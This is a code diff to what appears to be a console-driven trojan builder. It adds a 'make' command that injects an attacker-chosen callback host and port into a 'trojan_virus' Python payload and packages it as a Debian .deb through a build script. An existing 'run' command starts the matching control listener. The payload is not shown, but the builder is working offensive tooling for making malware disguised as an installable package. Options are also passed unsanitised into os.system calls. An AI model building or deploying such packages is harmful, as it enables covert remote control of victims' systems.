@@ -9,6 +9,18 @@ class options():
 
 op = options()
 
+def make_deb_package(runpath: str):
+
+    o = open(runpath+"/../Module/program/python/trojan_virus/trojan_virus.py")
+    with open( runpath + "/../Module/linux/amd64/trojan_virus/build/usr/1/program.py" , "w") as f:
+        f.write("connect: str=\""+op.host+"\"\n")
+        f.write("port: int="+str(op.port))
+        f.write(o.read())
+    f.close()
+
+    os.system("cd "+runpath + "/../Module/linux/amd64/trojan_virus/ && ./build.sh "+op.package_name+" "+op.make_path+" "+str(op.port)+" "+op.host)
+
+
 def show_options():
     print()
     print(" ++++")
@@ -73,6 +85,10 @@ def console(runpath: str):
 
         if command == 'show options':
             show_options()
+
+        if command == 'make':
+            make_deb_package(runpath)
+            continue
 
         if command == 'run':
             os.system("python3 "+runpath+"/../Module/program/python/trojan_virus/control.py "+str(op.port))
